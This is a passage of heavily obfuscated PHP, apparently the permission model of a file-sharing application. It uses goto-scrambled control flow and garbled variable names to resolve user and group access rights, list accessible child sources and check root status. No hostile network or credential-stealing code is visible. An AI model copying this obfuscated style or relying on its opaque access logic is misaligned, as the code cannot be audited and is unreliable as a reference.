$C–¶îöÒ = array(); foreach ($c§—’–‰¿¾ as $bò»î†š‰) { goto D±ô»Ã†æ¼; BÔŠò›Ş‹“: $cÀ¯ËÁ»øİ = count(explode($e‘ÙóÖÀ[8], trim($bò»î†š‰[$e‘ÙóÖÀ[489]], $e‘ÙóÖÀ[8]))); $C–¶îöÒ[] = $cÀ¯ËÁ»øİ + ($bò»î†š‰[$e‘ÙóÖÀ[29]] == $e‘ÙóÖÀ[76] ? 0 : 1000); goto fÅ„ä¨¥ù; D±ô»Ã†æ¼: unset($bò»î†š‰[$e‘ÙóÖÀ[428]]); unset($bò»î†š‰[$e‘ÙóÖÀ[426]]); unset($bò»î†š‰[$e‘ÙóÖÀ[400]]); goto EØçÑñë›•; EØçÑñë›•: unset($bò»î†š‰[$e‘ÙóÖÀ[84]]); $a¢Êï®² = $d¦£‰ö™øÃ[$bò»î†š‰[$e‘ÙóÖÀ[390]]]; if (!$a¢Êï®²) { continue; } goto fğóò½Ÿ—; fğóò½Ÿ—: $bò»î†š‰[$e‘ÙóÖÀ[1846]] = $this->authTargetInfo($a¢Êï®²); $bò»î†š‰[$e‘ÙóÖÀ[489]] = rtrim($bò»î†š‰[$e‘ÙóÖÀ[484]], $e‘ÙóÖÀ[8]) . $e‘ÙóÖÀ[8] . ltrim($bò»î†š‰[$e‘ÙóÖÀ[489]], $e‘ÙóÖÀ[8]); $bŸÙÇä[] = $bò»î†š‰; goto BÔŠò›Ş‹“; fÅ„ä¨¥ù: } goto bŞÑ ©³Ç; bŞÑ ©³Ç: array_multisort($C–¶îöÒ, SORT_ASC, $bŸÙÇä); return $bŸÙÇä; goto D»Ë¨—’Ï—; dÚ£—ˆºïÛ: $e‘ÙóÖÀ =& $_SERVER[ÉóçÄÇ]; $c§—’–‰¿¾ = Model($e‘ÙóÖÀ[1186])->sourceListInfo($fŸ‹Æ§¼´•, !0); $d¦£‰ö™øÃ = $this->sourceAuthSelect($fŸ‹Æ§¼´•); goto bƒ³Ùá–Ş™; D»Ë¨—’Ï—: } private function groupChidldAllRootSource($a÷ƒí‘¹¯Ñ) { $A©§ÑÕá”Š =& $_SERVER[ÉóçÄÇ]; $A§Ä¬ªê„— = Model($A©§ÑÕá”Š[1847])->groupChildrenAll($a÷ƒí‘¹¯Ñ); $e¦®Êõ ø = array($A©§ÑÕá”Š[472] => 0, $A©§ÑÕá”Š[478] => array($A©§ÑÕá”Š[7], $A§Ä¬ªê„—), $A©§ÑÕá”Š[398] => SourceModel::TYPE_GROUP); $d‡­‰Í¾¿ = Model($A©§ÑÕá”Š[776])->field($A©§ÑÕá”Š[390])->where($e¦®Êõ ø)->select(); $d‡­‰Í¾¿ = array_to_keyvalue($d‡­‰Í¾¿, $A©§ÑÕá”Š[33], $A©§ÑÕá”Š[390]); return $d‡­‰Í¾¿; } private function authTargetInfo($ešœ˜ˆ™˜†) { goto C¥ÏÏš ±‚; Fâ¦ÈÁøİƒ: return $CšˆÉ†Ï·ª; goto eªËÊëŒ£¥; C¥ÏÏš ±‚: $eçİ‰ÇÎ =& $_SERVER[ÉóçÄÇ]; $CšˆÉ†Ï·ª = array(); $aÔ©À»Çæ¶ = array(); goto fŠÈêôŒ§ì; fŠÈêôŒ§ì: $EìæÎ‚Ò‘ö = 2 << 25; foreach ($ešœ˜ˆ™˜† as $d‘õª¥«¯ˆ) { goto FìÊö‹¤Ò¯; aãŒ»ò“Ì: if (!$dÀÈä“’…) { continue; } $dÀÈä“’…[$eçİ‰ÇÎ[440]] = $a‹µ’¸“Ù; $CšˆÉ†Ï·ª[] = $dÀÈä“’…; goto dÁƒ†âëêé; FìÊö‹¤Ò¯: $a‹µ’¸“Ù = Model($eçİ‰ÇÎ[1842])->listData($d‘õª¥«¯ˆ[$eçİ‰ÇÎ[1770]]); if (!$a‹µ’¸“Ù) { continue; } if ($d‘õª¥«¯ˆ[$eçİ‰ÇÎ[398]] == SourceModel::TYPE_USER) { $dÀÈä“’… = Model($eçİ‰ÇÎ[497])->getInfoSimpleOuter($d‘õª¥«¯ˆ[$eçİ‰ÇÎ[478]]); if ($dÀÈä“’…[$eçİ‰ÇÎ[1511]] == $eçİ‰ÇÎ[1067]) { continue; } if ($dÀÈä“’…[$eçİ‰ÇÎ[1511]] == $eçİ‰ÇÎ[491]) { $dÀÈä“’…[$eçİ‰ÇÎ[28]] = LNG($eçİ‰ÇÎ[1848]); } } else { $dÀÈä“’… = Model($eçİ‰ÇÎ[480])->getInfoSimple($d‘õª¥«¯ˆ[$eçİ‰ÇÎ[478]]); } goto aãŒ»ò“Ì; a‹´«„¤ñ: if ($d‘õª¥«¯ˆ[$eçİ‰ÇÎ[398]] == SourceModel::TYPE_USER && $d‘õª¥«¯ˆ[$eçİ‰ÇÎ[478]] == $eçİ‰ÇÎ[491]) { $DàÊÀÍÙß‘ = 0; } $aÔ©À»Çæ¶[] = $a‹µ’¸“Ù[$eçİ‰ÇÎ[400]] + $DàÊÀÍÙß‘; goto EòÉ÷ƒÚ½’; dÁƒ†âëêé: $DàÊÀÍÙß‘ = 0; if ($d‘õª¥«¯ˆ[$eçİ‰ÇÎ[398]] == SourceModel::TYPE_GROUP) { $DàÊÀÍÙß‘ = $EìæÎ‚Ò‘ö * 2; } if ($d‘õª¥«¯ˆ[$eçİ‰ÇÎ[398]] == SourceModel::TYPE_USER) { $DàÊÀÍÙß‘ = $EìæÎ‚Ò‘ö; } goto a‹´«„¤ñ; EòÉ÷ƒÚ½’: } array_multisort($aÔ©À»Çæ¶, SORT_DESC, $CšˆÉ†Ï·ª); goto Fâ¦ÈÁøİƒ; eªËÊëŒ£¥: } public function getAllChildrenByUser($bìëÍÙæ¨, $Añß“åªÓ®) { goto b¼¨ñÕŒŠØ; DÖî çµÖ‚: foreach ($DŸ®Ê„õ as $Døİ†¹•Ç›) { $dğå“™”ÖÚ = !1; foreach ($Døİ†¹•Ç›[$A¨Ø÷îèÖ[1846]] as $a—‰Š×½Ï§) { if ($a—‰Š×½Ï§[$A¨Ø÷îèÖ[1511]]) { if ($a—‰Š×½Ï§[$A¨Ø÷îèÖ[1511]] == $Añß“åªÓ®) { $dğå“™”ÖÚ = !0; break; } } if ($a—‰Š×½Ï§[$A¨Ø÷îèÖ[1674]]) { if ($this->groupContainUser($a—‰Š×½Ï§[$A¨Ø÷îèÖ[1674]], $Añß“åªÓ®)) { $dğå“™”ÖÚ = !0; break; } } } if ($dğå“™”ÖÚ) { $b‡©×ë¼¦ô[] = $Døİ†¹•Ç›; } $b¶‰‹Õ¡­ó = $Døİ†¹•Ç›[$A¨Ø÷îèÖ[390]]; if (isset($C…óÇÃÃÌ¢[$b¶‰‹Õ¡­ó])) { $Døİ†¹•Ç›[$A¨Ø÷îèÖ[1846]][] = $C…óÇÃÃÌ¢[$b¶‰‹Õ¡­ó][0]; $C…óÇÃÃÌ¢[$b¶‰‹Õ¡­ó] = !1; } } $C…óÇÃÃÌ¢ = array_filter(array_values($C…óÇÃÃÌ¢)); $b‡©×ë¼¦ô = array_merge($C…óÇÃÃÌ¢, $b‡©×ë¼¦ô); goto Eí›‚‡¸¸ç; Eí›‚‡¸¸ç: return $b‡©×ë¼¦ô; goto f™œáÎ¸š; b¼¨ñÕŒŠØ: $A¨Ø÷îèÖ =& $_SERVER[ÉóçÄÇ]; $A¿š¸ó…äù = Model($A¨Ø÷îèÖ[501])->getInfo($Añß“åªÓ®); if (!$Añß“åªÓ® || !$bìëÍÙæ¨ || !$A¿š¸ó…äù) { return array(); } goto e’Ôã¾ïªë; A¨Áƒ£——­: if ($f‘ÊÀåÄêö[$A¨Ø÷îèÖ[472]] == $A¨Ø÷îèÖ[491] && $f‘ÊÀåÄêö[$A¨Ø÷îèÖ[478]] != $B•”èÉÎÜ && $this->groupContainUser($f‘ÊÀåÄêö[$A¨Ø÷îèÖ[478]], $Añß“åªÓ®)) { foreach ($A¿š¸ó…äù[$A¨Ø÷îèÖ[1849]] as $E¿ÊßÇÈõ–) { $cŸØÒËĞÂÉ = Model($A¨Ø÷îèÖ[480])->getInfo($E¿ÊßÇÈõ–[$A¨Ø÷îèÖ[1674]]); $bŞ¡Ø¡œ±Ş = Model($A¨Ø÷îèÖ[501])->getInfoSimpleOuter($Añß“åªÓ®); $bŞ¡Ø¡œ±Ş[$A¨Ø÷îèÖ[440]] = $E¿ÊßÇÈõ–[$A¨Ø÷îèÖ[400]]; if (Model($A¨Ø÷îèÖ[1842])->authCheckAction($E¿ÊßÇÈõ–[$A¨Ø÷îèÖ[400]][$A¨Ø÷îèÖ[400]], $A¨Ø÷îèÖ[1694])) { continue; } $fŒÑ¥Ï¤ï = array($A¨Ø÷îèÖ[28] => $A¨Ø÷îèÖ[1463] . $cŸØÒËĞÂÉ[$A¨Ø÷îèÖ[28]], $A¨Ø÷îèÖ[390] => $cŸØÒËĞÂÉ[$A¨Ø÷îèÖ[84]][$A¨Ø÷îèÖ[390]], $A¨Ø÷îèÖ[75] => KodIO::make($cŸØÒËĞÂÉ[$A¨Ø÷îèÖ[84]][$A¨Ø÷îèÖ[390]]), $A¨Ø÷îèÖ[472] => $A¨Ø÷îèÖ[491], $A¨Ø÷îèÖ[398] => $A¨Ø÷îèÖ[997], $A¨Ø÷îèÖ[29] => $A¨Ø÷îèÖ[512], $A¨Ø÷îèÖ[489] => $cŸØÒËĞÂÉ[$A¨Ø÷îèÖ[485]], $A¨Ø÷îèÖ[1674] => $cŸØÒËĞÂÉ[$A¨Ø÷îèÖ[1674]], $A¨Ø÷îèÖ[482] => $cŸØÒËĞÂÉ[$A¨Ø÷îèÖ[472]], $A¨Ø÷îèÖ[1846] => array($bŞ¡Ø¡œ±Ş)); $C…óÇÃÃÌ¢[$fŒÑ¥Ï¤ï[$A¨Ø÷îèÖ[390]]] = $fŒÑ¥Ï¤ï; } } $b‡©×ë¼¦ô = array(); $DŸ®Ê„õ = $this->getAllChildren($bìëÍÙæ¨); goto DÖî çµÖ‚; e’Ôã¾ïªë: $f‘ÊÀåÄêö = Model($A¨Ø÷îèÖ[1186])->sourceInfo($bìëÍÙæ¨); $C…óÇÃÃÌ¢ = array(); $B•”èÉÎÜ = 1; goto A¨Áƒ£——­; f™œáÎ¸š: } public function setAllChildrenByUser($fÉ¦ñØˆ, $aíÅÌÚ¹õ, $BìÀŞ¾¬¨¬) { $cƒ¹‚Úšª =& $_SERVER[ÉóçÄÇ]; $FÀÄ—á£İ« = $this->getAllChildrenByUser($fÉ¦ñØˆ, $aíÅÌÚ¹õ); if (!$BìÀŞ¾¬¨¬ || !$FÀÄ—á£İ«) { return !1; } foreach ($FÀÄ—á£İ« as $b±ƒ³ˆîÎ) { $F‹––ôĞ˜ = array(); foreach ($b±ƒ³ˆîÎ[$cƒ¹‚Úšª[1846]] as $CÊŒ§™¡ÏÈ) { $e©·£•×ê¸ = $CÊŒ§™¡ÏÈ[$cƒ¹‚Úšª[440]]; $A”î«Ù— = $CÊŒ§™¡ÏÈ[$cƒ¹‚Úšª[1511]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $BÆÃ‰ÆÓ’÷ = $CÊŒ§™¡ÏÈ[$cƒ¹‚Úšª[1511]] ? $CÊŒ§™¡ÏÈ[$cƒ¹‚Úšª[1511]] : $CÊŒ§™¡ÏÈ[$cƒ¹‚Úšª[1674]]; if ($CÊŒ§™¡ÏÈ[$cƒ¹‚Úšª[1511]] && $CÊŒ§™¡ÏÈ[$cƒ¹‚Úšª[1511]] == $aíÅÌÚ¹õ) { continue; } $F‹––ôĞ˜[] = array($cƒ¹‚Úšª[390] => $b±ƒ³ˆîÎ[$cƒ¹‚Úšª[390]], $cƒ¹‚Úšª[398] => $A”î«Ù—, $cƒ¹‚Úšª[478] => intval($BÆÃ‰ÆÓ’÷), $cƒ¹‚Úšª[1770] => isset($e©·£•×ê¸[$cƒ¹‚Úšª[388]]) ? intval($e©·£•×ê¸[$cƒ¹‚Úšª[388]]) : 0, $cƒ¹‚Úšª[1824] => isset($e©·£•×ê¸[$cƒ¹‚Úšª[1824]]) ? intval($e©·£•×ê¸[$cƒ¹‚Úšª[1824]]) : -1); } $F‹––ôĞ˜[] = array($cƒ¹‚Úšª[390] => $b±ƒ³ˆîÎ[$cƒ¹‚Úšª[390]], $cƒ¹‚Úšª[398] => SourceModel::TYPE_USER, $cƒ¹‚Úšª[478] => intval($aíÅÌÚ¹õ), $cƒ¹‚Úšª[1770] => intval($BìÀŞ¾¬¨¬), $cƒ¹‚Úšª[1824] => -1); $this->where(array($cƒ¹‚Úšª[404] => $b±ƒ³ˆîÎ[$cƒ¹‚Úšª[390]]))->delete(); $this->addAll($F‹––ôĞ˜); } return !0; } public function get($B‰ğàÉè„) { $B¨›á®“óè = $this->getSourceList(array($B‰ğàÉè„), !0); return $B¨›á®“óè[0]; } public function getSourceList($A§µë”Ì…ì, $C»ŸÜœ†Ğè = false, $D‚æò¡éŞ© = false) { goto c¼”Ø•¦Œï; f­ç‹˜“¬½: $CÒ¨Û±ó = $this->sourceAuthSelect($a×ÕâÀğ£š); $Dä¥÷‹ÇÑĞ = array(); foreach ($a×ÕâÀğ£š as $Eáòç´ó) { if (isset($CÒ¨Û±ó[$Eáòç´ó])) { $Dä¥÷‹ÇÑĞ[$Eáòç´ó] = $CÒ¨Û±ó[$Eáòç´ó]; } } goto F²÷¨áÛô; c¼”Ø•¦Œï: $F¼•èçÁÒ =& $_SERVER[ÉóçÄÇ]; if (!$A§µë”Ì…ì) { return array(); } $E†µÇŞé‹Ú = Model($F¼•èçÁÒ[1186]); goto BÖÁİ¼‹Ò‹; aĞòÍÕÅº: $a“¨ßÔ¯á = array(); foreach ($C»ŸÜœ†Ğè as $Eáòç´ó => $D½µÔê±½Ä) { if ($eõ„éšöÉ¾) { $a“¨ßÔ¯á[$Eáòç´ó] = $Bğ´ÉñÇ¹Ğ; continue; } $a“¨ßÔ¯á[$Eáòç´ó] = $this->makeSourceAuth($D½µÔê±½Ä, $Dä¥÷‹ÇÑĞ, $D‚æò¡éŞ©); } return $a“¨ßÔ¯á; goto a¼Ñ‰Ö™ÈÓ; a«êÒ‘–‘: foreach ($C»ŸÜœ†Ğè as $Eà‹¸ÀÖà => $C·×öÊáÆÄ) { $c»¿³•Úí = $E†µÇŞé‹Ú->parentLevelArray($C·×öÊáÆÄ[$F¼•èçÁÒ[481]]); $a×ÕâÀğ£š = array_merge($a×ÕâÀğ£š, array($Eà‹¸ÀÖà), array_reverse($c»¿³•Úí)); } $a×ÕâÀğ£š = array_values(array_unique($a×ÕâÀğ£š)); if (!$a×ÕâÀğ£š) { return array(); } goto f­ç‹˜“¬½; BÖÁİ¼‹Ò‹: if (!$C»ŸÜœ†Ğè && count($A§µë”Ì…ì) == 1) { $C»ŸÜœ†Ğè = array(); $C»ŸÜœ†Ğè[$A§µë”Ì…ì[0]] = $E†µÇŞé‹Ú->sourceInfo($A§µë”Ì…ì[0]); } if (!$C»ŸÜœ†Ğè) { $aÙŠ¯éª = array($F¼•èçÁÒ[404] => array($F¼•èçÁÒ[405], $A§µë”Ì…ì)); $C»ŸÜœ†Ğè = $E†µÇŞé‹Ú->field($F¼•èçÁÒ[1850])->where($aÙŠ¯éª)->select(); $C»ŸÜœ†Ğè = array_to_keyvalue($C»ŸÜœ†Ğè, $F¼•èçÁÒ[390]); } $a×ÕâÀğ£š = $A§µë”Ì…ì; goto a«êÒ‘–‘; F²÷¨áÛô: $eõ„éšöÉ¾ = $this->userIsRoot($D‚æò¡éŞ©); $eã·áöĞÔ¬ = AuthModel::authAll(); $Bğ´ÉñÇ¹Ğ = array($F¼•èçÁÒ[401] => $eã·áöĞÔ¬, $F¼•èçÁÒ[1851] => array($F¼•èçÁÒ[406] => 0, $F¼•èçÁÒ[1680] => $eã·áöĞÔ¬, $F¼•èçÁÒ[407] => LNG($F¼•èçÁÒ[1852]), $F¼•èçÁÒ[1695] => $F¼•èçÁÒ[1853])); goto aĞòÍÕÅº; a¼Ñ‰Ö™ÈÓ: } public function authDeepCheck($cÏ“¦ÕĞå, $Dô½ÄŸœĞµ = false) { goto cÅ¯Ë„†®Å; d§‘ÆÓˆ: if (!$DÆÚ¯¸œ¿Ñ) { return !1; } $cœ˜²ÒŠ¸ = $DÆÚ¯¸œ¿Ñ ? $DÆÚ¯¸œ¿Ñ[0] : $cÏ“¦ÕĞå; return array($b–¦Ü¤…… [401] => -1, $b–¦Ü¤…… [440] => array($b–¦Ü¤…… [406] => $b–¦Ü¤…… [1067], $b–¦Ü¤…… [1680] => $b–¦Ü¤…… [491], $b–¦Ü¤…… [407] => LNG($b–¦Ü¤…… [1856]), $b–¦Ü¤…… [1695] => $b–¦Ü¤…… [1857]), $b–¦Ü¤…… [1858] => LNG($b–¦Ü¤…… [1859]), $b–¦Ü¤…… [1860] => $this->sourceAuthInfo($cœ˜²ÒŠ¸)); goto D•„´Õ¬‚â; cÅ¯Ë„†®Å: $b–¦Ü¤……  =& $_SERVER[ÉóçÄÇ]; $Dô½ÄŸœĞµ = $Dô½ÄŸœĞµ ? $Dô½ÄŸœĞµ : USER_ID; $e•íñğ¢šŒ = $this->makeAuthDeep($Dô½ÄŸœĞµ); goto bçÓ‚ïâŸ°; bçÓ‚ïâŸ°: if (!in_array($cÏ“¦ÕĞå, $e•íñğ¢šŒ[$b–¦Ü¤…… [1854]])) { return !1; } $DÆÚ¯¸œ¿Ñ = array(); foreach ($e•íñğ¢šŒ[$b–¦Ü¤…… [1855]] as $AŒ“æÍ‘ÈŞ => $eİÆŠâ³¼ˆ) { if (!in_array($cÏ“¦ÕĞå, $eİÆŠâ³¼ˆ)) { continue; } $DÆÚ¯¸œ¿Ñ[] = $AŒ“æÍ‘ÈŞ; } goto d§‘ÆÓˆ; D•„´Õ¬‚â: } protected function makeAuthDeep($FŞ°¸ÅÎæ = false) { goto C£Æ ©åá—; AĞµ³·—ÖÜ: $aÄ»—Øí‘‘ = array(); $aà»æí¸ëˆ = array(); $c„°Ÿ¯ä¤Ò = array(); goto d™î†ÔÔ£ë; e…ô×ÓÁ©†: $FäÃ‚æÄ‹¥ = $C±Ó÷Õ¹; $Fù”ØÅÆ½ = Model($cÇÓ¦ñˆâ[1186]); $C•„Œ£õ¹ë = Model($cÇÓ¦ñˆâ[480]); goto AĞµ³·—ÖÜ; cëÖø­íŒƒ: foreach ($e”Ÿ÷„Ó¸ñ as $Bº©ÁËé¨) { if ($Bº©ÁËé¨[$cÇÓ¦ñˆâ[400]] == 0 && $Bº©ÁËé¨[$cÇÓ¦ñˆâ[1696]] == $cÇÓ¦ñˆâ[86]) { $eŸğÜğé‹[] = $Bº©ÁËé¨[$cÇÓ¦ñˆâ[388]]; } } $C±Ó÷Õ¹ = $this->userGroupParents($FŞ°¸ÅÎæ); $CÜ‡Û÷ ø« = array($cÇÓ¦ñˆâ[398] => SourceModel::TYPE_USER, $cÇÓ¦ñˆâ[478] => $FŞ°¸ÅÎæ); goto E±„±™â±; C£Æ ©åá—: $cÇÓ¦ñˆâ =& $_SERVER[ÉóçÄÇ]; static $DõÕ‰ŒÖ•À = array(); $FŞ°¸ÅÎæ = $FŞ°¸ÅÎæ ? $FŞ°¸ÅÎæ : USER_ID; goto d«¨‡ˆ†²ƒ; E±„±™â±: if ($C±Ó÷Õ¹) { $CÜ‡Û÷ ø« = array(array($cÇÓ¦ñˆâ[398] => SourceModel::TYPE_USER, $cÇÓ¦ñˆâ[478] => $FŞ°¸ÅÎæ), array($cÇÓ¦ñˆâ[398] => SourceModel::TYPE_GROUP, $cÇÓ¦ñˆâ[478] => array($cÇÓ¦ñˆâ[405], $C±Ó÷Õ¹)), $cÇÓ¦ñˆâ[939] => $cÇÓ¦ñˆâ[1762]); } $eåÕ¥ğ·š = $this->field($cÇÓ¦ñˆâ[1862])->where($CÜ‡Û÷ ø«)->select(); $c‘Ê…µòõ = array(); goto b¾…éÔ±; f’æÂä§ì÷: $C©ñÔÜŸâ‚ = array($cÇÓ¦ñˆâ[1854] => $F¼Å¸ƒ¶Š, $cÇÓ¦ñˆâ[1855] => $aÄ»—Øí‘‘); $DõÕ‰ŒÖ•À[$FŞ°¸ÅÎæ] = $C©ñÔÜŸâ‚; return $C©ñÔÜŸâ‚; goto a–¯ŸõÆÁ; d«¨‡ˆ†²ƒ: if (isset($DõÕ‰ŒÖ•À[$FŞ°¸ÅÎæ])) { return $DõÕ‰ŒÖ•À[$FŞ°¸ÅÎæ]; } $e”Ÿ÷„Ó¸ñ = Model($cÇÓ¦ñˆâ[1861])->listData(); $eŸğÜğé‹ = array(); goto cëÖø­íŒƒ; b¾…éÔ±: $Eò §Ê»Û = array_to_keyvalue_group($eåÕ¥ğ·š, $cÇÓ¦ñˆâ[390]); foreach ($Eò §Ê»Û as $E¦Âäùº¦ª => $E¸Üƒ…‰Ü¤) { $bÚĞº‹ÏÌ  = $this->authArrayCheck($E¸Üƒ…‰Ü¤, $FŞ°¸ÅÎæ); if ($bÚĞº‹ÏÌ [$cÇÓ¦ñˆâ[401]] > 0) { $c‘Ê…µòõ[] = $E¦Âäùº¦ª . $cÇÓ¦ñˆâ[33]; } } $F¼Å¸ƒ¶Š = array(); goto e…ô×ÓÁ©†; E»ª‹Ç¯”: foreach ($FäÃ‚æÄ‹¥ as $bìÍöŸÍ“´) { $C²œê‡•ó = $C•„Œ£õ¹ë->getInfo($bìÍöŸÍ“´); $F¼Å¸ƒ¶Š[] = $C²œê‡•ó[$cÇÓ¦ñˆâ[84]][$cÇÓ¦ñˆâ[390]]; $c„°Ÿ¯ä¤Ò[$bìÍöŸÍ“´] = $C²œê‡•ó[$cÇÓ¦ñˆâ[84]][$cÇÓ¦ñˆâ[390]]; $DÊêŒ¬»ÙÀ[$bìÍöŸÍ“´] = $Fù”ØÅÆ½->parentLevelArray($C²œê‡•ó[$cÇÓ¦ñˆâ[481]]); } foreach ($aÄ»—Øí‘‘ as $F·–Óˆ™¹ => $cœøÊŸ‚Ä) { $D×…—©ïÙ = $aà»æí¸ëˆ[$F·–Óˆ™¹]; if (!$D×…—©ïÙ || !$c„°Ÿ¯ä¤Ò[$D×…—©ïÙ]) { continue; } $F‰İ©Ğ¥¢¤ = array(); foreach ($DÊêŒ¬»ÙÀ[$D×…—©ïÙ] as $bìÍöŸÍ“´) { $F‰İ©Ğ¥¢¤[] = $c„°Ÿ¯ä¤Ò[$bìÍöŸÍ“´]; } $aÄ»—Øí‘‘[$F·–Óˆ™¹] = array_merge($F‰İ©Ğ¥¢¤, $cœøÊŸ‚Ä); } $F¼Å¸ƒ¶Š = array_values(array_unique($F¼Å¸ƒ¶Š)); goto f’æÂä§ì÷; d™î†ÔÔ£ë: $DÊêŒ¬»ÙÀ = array(); if ($c‘Ê…µòõ) { $C­—‘¿Òº‰ = $Fù”ØÅÆ½->where(array($cÇÓ¦ñˆâ[390] => array($cÇÓ¦ñˆâ[405], $c‘Ê…µòõ)))->select(); foreach ($C­—‘¿Òº‰ as $c¾ˆÒÀÙõÇ) { $fó–îŒ½µİ = $Fù”ØÅÆ½->parentLevelArray($c¾ˆÒÀÙõÇ[$cÇÓ¦ñˆâ[481]]); $F¼Å¸ƒ¶Š = array_merge($F¼Å¸ƒ¶Š, $fó–îŒ½µİ); $FäÃ‚æÄ‹¥[] = $c¾ˆÒÀÙõÇ[$cÇÓ¦ñˆâ[478]]; $aÄ»—Øí‘‘[$c¾ˆÒÀÙõÇ[$cÇÓ¦ñˆâ[390]]] = $fó–îŒ½µİ; $aà»æí¸ëˆ[$c¾ˆÒÀÙõÇ[$cÇÓ¦ñˆâ[390]]] = $c¾ˆÒÀÙõÇ[$cÇÓ¦ñˆâ[478]]; } } $FäÃ‚æÄ‹¥ = array_values(array_unique($FäÃ‚æÄ‹¥)); goto Eö­°Í´İ; Eö­°Í´İ: $DîªàÜ‡»µ = $FäÃ‚æÄ‹¥; foreach ($DîªàÜ‡»µ as $bìÍöŸÍ“´) { $C²œê‡•ó = $C•„Œ£õ¹ë->getInfo($bìÍöŸÍ“´); $fó–îŒ½µİ = $Fù”ØÅÆ½->parentLevelArray($C²œê‡•ó[$cÇÓ¦ñˆâ[481]]); $FäÃ‚æÄ‹¥ = array_merge($FäÃ‚æÄ‹¥, $fó–îŒ½µİ); } $FäÃ‚æÄ‹¥ = array_values(array_unique($FäÃ‚æÄ‹¥)); goto E»ª‹Ç¯”; a–¯ŸõÆÁ: } private function makeSourceAuth($c¡áºÕ²½ã, $cÁïÛ‹», $cõ´ŒÛÕ­¾ = false) { goto E‹Ëëßµˆå; D‰ŠÒÍÌ“: foreach ($f”ˆ§Øç‚Í as $Cå„˜—§„) { if (!isset($cÁïÛ‹»[$Cå„˜—§„])) { continue; } $aÁµ†Ô•°ê = $this->authMake($cÁïÛ‹»[$Cå„˜—§„], $cõ´ŒÛÕ­¾); if ($aÁµ†Ô•°ê[$b†ï¹®‡ÉÌ[440]]) { $aö’øËÚ¦ = $aÁµ†Ô•°ê; break; } } if (!$bÏŒ´¶«â) { return $aö’øËÚ¦; } if (!$aö’øËÚ¦ && $b¸œÖÒ†ĞŠ) { $aö’øËÚ¦ = $this->groupAuthInfo($b¸œÖÒ†ĞŠ, $fÍö¹Öğ«); } goto C¾ßŠĞÁ°¦; dç„ö¾Åƒñ: $f”ˆ§Øç‚Í = Model($b†ï¹®‡ÉÌ[1186])->parentLevelArray($c¡áºÕ²½ã[$b†ï¹®‡ÉÌ[481]]); $f”ˆ§Øç‚Í = array_merge(array($c¡áºÕ²½ã[$b†ï¹®‡ÉÌ[390]]), array_reverse($f”ˆ§Øç‚Í)); $aö’øËÚ¦ = !1; goto D‰ŠÒÍÌ“; fˆ…Êƒ‰Ş¨: $bÏŒ´¶«â = $c¡áºÕ²½ã[$b†ï¹®‡ÉÌ[398]] == SourceModel::TYPE_GROUP; $b¸œÖÒ†ĞŠ = $bÏŒ´¶«â ? $this->groupRootAuth($fÍö¹Öğ«, $cõ´ŒÛÕ­¾) : !1; if ($b¸œÖÒ†ĞŠ && Model($b†ï¹®‡ÉÌ[1842])->authCheckAction($b¸œÖÒ†ĞŠ[$b†ï¹®‡ÉÌ[400]], $b†ï¹®‡ÉÌ[1694])) { return $this->groupAuthInfo($b¸œÖÒ†ĞŠ, $fÍö¹Öğ«); } goto dç„ö¾Åƒñ; C¾ßŠĞÁ°¦: if (!$aö’øËÚ¦) { $FÀ£ÒÎ÷­· = Model($b†ï¹®‡ÉÌ[480])->getInfo($fÍö¹Öğ«); $fÎ¶ÌÙçŞ» = explode($b†ï¹®‡ÉÌ[47], trim($FÀ£ÒÎ÷­·[$b†ï¹®‡ÉÌ[481]], $b†ï¹®‡ÉÌ[47])); $fÎ¶ÌÙçŞ» = array_reverse($fÎ¶ÌÙçŞ»); foreach ($fÎ¶ÌÙçŞ» as $a×â’Ä¿‰) { if ($a×â’Ä¿‰ == $b†ï¹®‡ÉÌ[491] || $a×â’Ä¿‰ == $EÄ‘éÅÀÑÉ) { continue; } $FİµËê = $this->groupRootAuth($a×â’Ä¿‰, $cõ´ŒÛÕ­¾); if (!$FİµËê) { continue; } $aö’øËÚ¦ = $this->groupAuthInfo($FİµËê, $a×â’Ä¿‰); break; } } if (!$aö’øËÚ¦ || $aö’øËÚ¦[$b†ï¹®‡ÉÌ[401]] <= 0) { $bÖÄ¼µĞğ¯ = $this->authDeepCheck($c¡áºÕ²½ã[$b†ï¹®‡ÉÌ[390]], $cõ´ŒÛÕ­¾); if ($bÖÄ¼µĞğ¯) { $aö’øËÚ¦ = $bÖÄ¼µĞğ¯; } } return $aö’øËÚ¦; goto Dë˜’’Øø; E‹Ëëßµˆå: $b†ï¹®‡ÉÌ =& $_SERVER[ÉóçÄÇ]; $EÄ‘éÅÀÑÉ = $b†ï¹®‡ÉÌ[86]; $fÍö¹Öğ« = $c¡áºÕ²½ã[$b†ï¹®‡ÉÌ[478]]; goto fˆ…Êƒ‰Ş¨; Dë˜’’Øø: } private function userIsRoot($a‘¬ó«‡ƒ = false) { $CàëíÔÔòÍ =& $_SERVER[ÉóçÄÇ]; if (!$a‘¬ó«‡ƒ && _get($GLOBALS, $CàëíÔÔòÍ[479])) { return !0; } $Cêğ’½¶ = Model($CàëíÔÔòÍ[501])->getInfo($a‘¬ó«‡ƒ); $bõ—Öã»é¿ = Model($CàëíÔÔòÍ[1863])->listData($Cêğ’½¶[$CàëíÔÔòÍ[1393]]); if ($bõ—Öã»é¿ && $bõ—Öã»é¿[$CàëíÔÔòÍ[1263]][$CàëíÔÔòÍ[1864]] == 1) { return !0; } return !1; } private function sourceAuthInfo($AÇ°Ë„Â¢Î) { goto FäÈ—»—†ƒ; FäÈ—»—†ƒ: $b†•ÔåŒ =& $_SERVER[ÉóçÄÇ]; $FàñÉÍ”Å = Model($b†•ÔåŒ[1186]); $d‡ƒÑ×‡Ä = $FàñÉÍ”Å->sourceInfo($AÇ°Ë„Â¢Î); goto d˜¤äŸòİ; d˜¤äŸòİ: if (!$d‡ƒÑ×‡Ä) { return !1; } $FàñÉÍ”Å->groupPathDisplay($d‡ƒÑ×‡Ä); $CÏ¹‡Å¼ÚÓ = array($d‡ƒÑ×‡Ä); goto D¤õ¢èØğ–; A»·¨µó³: if (isset($d‡ƒÑ×‡Ä[$b†•ÔåŒ[486]])) { $d°®ÕºÚéÊ = explode($b†•ÔåŒ[8], trim($d‡ƒÑ×‡Ä[$b†•ÔåŒ[489]], $b†•ÔåŒ[8])); array_shift($d°®ÕºÚéÊ); $D‚Šëï‹™ = $d‡ƒÑ×‡Ä[$b†•ÔåŒ[484]] . $b†•ÔåŒ[1865] . implode($b†•ÔåŒ[8], $d°®ÕºÚéÊ); } return array($b†•ÔåŒ[407] => $d‡ƒÑ×‡Ä[$b†•ÔåŒ[28]], 